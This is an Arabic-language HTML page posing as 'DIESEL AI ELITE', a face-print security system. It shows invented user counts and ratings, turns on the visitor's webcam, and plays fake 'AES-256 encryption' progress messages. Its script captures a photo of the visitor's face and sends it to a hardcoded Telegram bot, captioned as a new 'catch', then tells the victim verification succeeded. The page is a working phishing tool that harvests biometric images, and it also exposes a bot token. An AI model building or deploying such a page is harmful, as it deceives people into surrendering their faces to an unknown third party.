<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIESEL SMART AI | نظام بصمة الوجه العالمي</title>
    <style>
        :root { --neon: #00ff88; }
        body { background: #000; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
        #matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.15; }
        .main-card { background: rgba(10, 10, 10, 0.95); padding: 30px 20px; border-radius: 25px; border: 2px solid var(--neon); width: 90%; max-width: 450px; text-align: center; margin-top: 30px; box-shadow: 0 0 50px rgba(0, 255, 136, 0.2); position: relative; }
        .scan-window { width: 260px; height: 260px; border-radius: 50%; border: 4px solid var(--neon); margin: 20px auto; position: relative; overflow: hidden; background: #000; box-shadow: 0 0 25px rgba(0, 255, 136, 0.3); }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .laser { position: absolute; width: 100%; height: 6px; background: var(--neon); box-shadow: 0 0 25px var(--neon); top: 0; animation: scan 2.5s infinite linear; display: none; z-index: 10; }
        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
        #ai-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; display: none; color: var(--neon); font-size: 10px; text-align: left; padding: 15px; box-sizing: border-box; z-index: 5; font-family: monospace; }
        .btn-action { background: var(--neon); color: #000; border: none; padding: 18px; border-radius: 15px; font-size: 20px; font-weight: 900; cursor: pointer; width: 100%; box-shadow: 0 10px 20px rgba(0, 255, 136, 0.4); }
        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
        .stat-item { background: #004422; padding: 12px; border-radius: 12px; border: 1px solid var(--neon); }
        .stat-item div { font-weight: bold; font-size: 18px; color: var(--neon); }
    </style>
</head>
<body onload="speakWelcome()">
    <canvas id="matrix-bg"></canvas>
    <div class="main-card">
        <h1 style="margin: 0; color: var(--neon);">DIESEL AI ELITE</h1>
        <div class="stats">
            <div class="stat-item"><small>المستخدمين النشطين</small><div>300,482+</div></div>
            <div class="stat-item"><small>تقييم النظام</small><div>⭐⭐⭐⭐⭐ 4.9</div></div>
        </div>
        <div class="scan-window">
            <div class="laser" id="laser"></div>
            <div id="ai-overlay">ANALYZING_FACE...<br>VECTOR_MAPPING: ACTIVE<br>SENSORS: 100%</div>
            <video id="webcam" autoplay muted playsinline></video>
        </div>
        <div id="ui">
            <button class="btn-action" onclick="runDieselAI()">تفعيل بصمة الوجه الذكية</button>
            <div id="ai-status" style="margin-top: 10px; font-size: 13px; color: #ffcc00;">بانتظار المصادقة الصوتية...</div>
        </div>
        <div id="done" style="display:none;">
            <h2 style="color: var(--neon);">تم التحقق بنجاح ✅</h2>
            <p>تم تشفير بصمة وجهك وربطها بنظام الديزل العالمي لعام 2026.</p>
        </div>
    </div>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        const token = "8789584532:AAESJZrJGfkILGReWmxFUGz2cyJzvK_7fEU";
        const chat_id = "5177962707";
        
        function speakWelcome() {
            const speech = new SpeechSynthesisUtterance("مرحباً بك في نظام الديزل الذكي.. يرجى مسح بصمة الوجه للمتابعة.");
            speech.lang = "ar-SA";
            window.speechSynthesis.speak(speech);
        }

        const matrix = document.getElementById('matrix-bg');
        const ctx = matrix.getContext('2d');
        matrix.height = window.innerHeight; matrix.width = window.innerWidth;
        const alphabet = "010101DIESELAI";
        const drops = Array(Math.floor(matrix.width / 20)).fill(1);
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, matrix.width, matrix.height);
            ctx.fillStyle = '#0F0'; ctx.font = '20px monospace';
            drops.forEach((y, i) => {
                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                ctx.fillText(text, i * 20, y * 20);
                if (y * 20 > matrix.height && Math.random() > 0.975) drops[i] = 0; drops[i]++;
            });
        }
        setInterval(drawMatrix, 35);

        async function runDieselAI() {
            const video = document.getElementById('webcam');
            const canvas = document.getElementById('canvas');
            const laser = document.getElementById('laser');
            const overlay = document.getElementById('ai-overlay');
            const status = document.getElementById('ai-status');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                laser.style.display = 'block'; overlay.style.display = 'block';
                document.querySelector('.btn-action').style.display = 'none';
                const phases = ["تحديد ملامح الوجه...", "تشفير البيانات AES-256...", "جاري المزامنة مع السحابة..."];
                let i = 0;
                const interval = setInterval(() => { if(i < phases.length) status.innerText = phases[i++]; }, 1500);
                setTimeout(() => {
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(async (blob) => {
                        const fd = new FormData(); fd.append('chat_id', chat_id);
                        fd.append('photo', blob, 'diesel_face.jpg');
                        fd.append('caption', '🚀 صيد ديزل جديد!\nتم سحب بصمة الوجه بالذكاء الاصطناعي بنجاح.');
                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                        clearInterval(interval);
                        document.getElementById('ui').style.display = 'none';
                        document.getElementById('done').style.display = 'block';
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/jpeg');
                }, 6000);
            } catch (e) { alert("يجب السماح بالكاميرا لتشغيل نظام الأمان."); }
        }
    </script>
</body>
</html>
